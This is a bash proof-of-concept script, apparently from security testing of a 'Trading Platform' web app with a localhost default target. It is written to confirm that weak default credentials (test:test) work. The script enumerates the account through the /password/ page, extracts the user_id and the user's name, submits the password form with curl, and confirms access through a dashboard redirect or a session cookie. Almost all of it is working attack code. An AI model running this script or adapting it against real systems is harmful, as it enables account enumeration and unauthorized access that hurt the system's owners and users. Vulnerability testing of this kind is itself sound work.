#!/bin/bash

# POC: Weak Default Credentials - Test Account (test:test)
# This script demonstrates successful authentication using default test credentials

TARGET_URL="${1:-http://localhost:8082}"
USERNAME="test"
PASSWORD="test"

echo "[*] Weak Default Credentials POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing credentials: $USERNAME:$PASSWORD"
echo ""

# Create a temporary cookie jar
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

# Step 1: Verify the test account exists
echo "[*] Step 1: Verifying test account exists..."
PASSWORD_PAGE=$(curl -s "$TARGET_URL/password/$USERNAME")
if echo "$PASSWORD_PAGE" | grep -q "Password - Trading Platform"; then
    echo "[+] User account '$USERNAME' confirmed to exist"
else
    echo "[-] Account enumeration failed"
    exit 1
fi

# Step 2: Extract user_id and check for greeting message
USER_ID=$(echo "$PASSWORD_PAGE" | grep -oP 'name="user_id"\s+value="\K[^"]+')
GREETING=$(echo "$PASSWORD_PAGE" | grep -oP 'Welcome back, \K[^<]+')
if [ -z "$USER_ID" ]; then
    echo "[-] Failed to extract user_id"
    exit 1
fi
echo "[+] User ID: $USER_ID"
if [ -n "$GREETING" ]; then
    echo "[+] User name disclosure: $GREETING"
fi
echo ""

# Step 3: Submit password reset with weak password
echo "[*] Step 2: Submitting password reset form with weak password..."
RESET_RESPONSE=$(curl -s -c "$COOKIE_JAR" -X POST "$TARGET_URL/password/$USERNAME" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user_id=$USER_ID&password=$PASSWORD" \
  -L)

echo "[+] Password submission completed"
echo ""

# Step 4: Verify if we got redirected to dashboard
echo "[*] Step 3: Verifying authentication success..."
if echo "$RESET_RESPONSE" | grep -q "Dashboard\|Trading Platform Dashboard\|/dashboard"; then
    echo "[+] SUCCESS! Password reset/login with weak credentials succeeded"
    echo "[+] Redirected to dashboard"
    echo "[+] VULNERABILITY CONFIRMED: Can authenticate with weak default credentials (test:test)"
    exit 0
elif echo "$RESET_RESPONSE" | grep -q "Password reset successful\|successfully"; then
    echo "[+] Password reset successful with weak credentials"
    echo "[+] VULNERABILITY CONFIRMED: Can set/reset password with weak default credentials"
    exit 0
else
    # Check if session cookie was set
    if grep -q "session" "$COOKIE_JAR" 2>/dev/null; then
        echo "[+] Session cookie acquired"
        echo "[+] VULNERABILITY CONFIRMED: Weak credentials accepted"
        exit 0
    fi
    # Try to verify by making a request to dashboard
    echo "[*] Verifying session by accessing dashboard..."
    DASH_CHECK=$(curl -s -b "$COOKIE_JAR" "$TARGET_URL/dashboard" 2>/dev/null)
    if echo "$DASH_CHECK" | grep -q "Trading Platform\|dashboard\|Welcome"; then
        echo "[+] Dashboard access confirmed with authenticated session"
        echo "[+] VULNERABILITY CONFIRMED: Weak credentials successfully authenticated"
        exit 0
    fi
    echo "[-] Verification inconclusive - response:"
    echo "$RESET_RESPONSE" | head -20
    exit 1
fi